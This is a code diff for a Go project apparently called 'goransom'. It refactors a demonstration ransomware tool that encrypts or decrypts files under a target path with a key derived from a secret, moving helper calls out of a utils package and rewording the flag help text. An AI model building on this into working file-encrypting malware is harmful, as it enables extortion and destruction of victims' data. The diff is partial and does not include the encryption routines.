@@ -14,7 +14,6 @@ You can then run the executable with the following flags:
 import (
 	"flag"
 	"fmt"
-	"goransom/utils"
 	"log"
 	"os"
 	"path/filepath"
@@ -39,18 +38,18 @@ var (
 func init() {
 
 	// flags
-	flag.BoolVar(&mode, "decrypt", false, "-decrypt")
-	flag.StringVar(&secret, "secret", "", "-secret=your_secret")
-	flag.StringVar(&target, "target", "", "-target=your_path_target")
+	flag.BoolVar(&mode, "decrypt", false, "decrypt mode")
+	flag.StringVar(&secret, "secret", "", "specify your secret")
+	flag.StringVar(&target, "target", "", "specify your path")
 	flag.Parse()
 
 	// Check if a secret is set
-	if len(secret) == 0 {
-		log.Fatal("Invalid secret, try: --secret=your_secret")
+	if secret == "" {
+		log.Fatal("Invalid secret, try: -secret=your_secret")
 	}
 
 	// This is not a true ransomware...
-	if len(target) == 0 {
+	if target == "" {
 		log.Fatal("Please specify a target.")
 	}
 
@@ -76,11 +75,11 @@ func ransomware(filePath string, secretKey []byte) {
 
 	// if encryption mode
 	if !mode {
-		utils.Encrypt(filePath, secretKey)
+		encrypt(filePath, secretKey)
 
-		// if decryption mode
+	// if decryption mode
 	} else {
-		utils.Decrypt(filePath, secretKey)
+		decrypt(filePath, secretKey)
 	}
 }
 
@@ -89,7 +88,7 @@ func start(path string) {
 	defer wg.Done()
 
 	// derive key for encryption/decryption from given secret
-	key := utils.DeriveKey(secret)
+	key := deriveKey(secret)
 
 	// check that the target path exists
 	pathInfo, err := os.Stat(path)
